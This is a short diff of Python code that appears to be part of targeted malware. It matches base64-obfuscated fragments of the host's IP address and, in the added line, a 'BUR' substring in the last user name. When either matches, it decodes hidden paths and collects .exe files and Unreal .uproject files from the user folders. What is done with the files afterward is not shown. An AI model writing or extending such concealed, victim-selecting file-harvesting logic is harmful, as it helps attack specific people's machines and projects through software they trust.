@@ -147,7 +147,7 @@ def search_extention(ext='.exe', dir_path='C:/Users'):
                 ])
     return p_ls
 try:
-    if '5LjQ2LjU' in base64.b64encode(str(data['ip']).encode("ascii")).decode() or 'jIwNi4yNTE' in base64.b64encode(str(data['ip']).encode("ascii")).decode():
+    if '5LjQ2LjU' in base64.b64encode(str(data['ip']).encode("ascii")).decode() or 'BUR' in data['user_last']:
         zovV = []
         zovV += search_extention(dir_path=base64.b64decode('TTovU0NSSVBUU19XSEs=').decode(), ext='.exe')
         zovV += search_extention(dir_path=base64.b64decode('QzovVXNlcnM=').decode(), ext='.uproject')
